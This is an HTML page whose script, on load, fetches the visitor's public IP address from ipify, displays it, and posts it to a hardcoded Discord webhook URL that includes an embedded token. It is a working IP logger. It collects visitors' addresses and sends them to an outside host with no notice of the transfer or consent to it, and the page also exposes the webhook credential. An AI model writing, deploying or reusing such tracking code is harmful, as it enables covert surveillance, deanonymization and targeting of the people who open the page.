<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send IP to Discord Webhook</title>
</head>
<body>
    <h1>Your IP Address</h1>
    <p id="ip">Fetching...</p>

    <script>
        // Replace with your actual Discord Webhook URL
        const discordWebhookUrl = 'https://discord.com/api/webhooks/1323821840401170533/6T3yIRWSpaEhQtbI3KMBgi48cXzDojIqRxsG8NkCIjZEsVSgPX9y64mn0xS2eGbd_-_G';

        // Fetch the user's IP address from ipify API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIp = data.ip;
                document.getElementById('ip').innerText = `Your IP Address is: ${userIp}`;

                // Create the message payload to send to Discord
                const webhookPayload = {
                    content: `New IP Address Detected: ${userIp}`
                };

                // Send the payload to the Discord Webhook
                fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(webhookPayload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('IP sent to Discord successfully!');
                    } else {
                        console.error('Failed to send IP to Discord. Response:', response);
                        return response.json(); // Get additional info
                    }
                })
                .then(data => {
                    if (data) {
                        console.log('Error details from Discord:', data);
                    }
                })
                .catch(error => {
                    console.error('Error sending IP to Discord:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
            });
    </script>
</body>
</html>
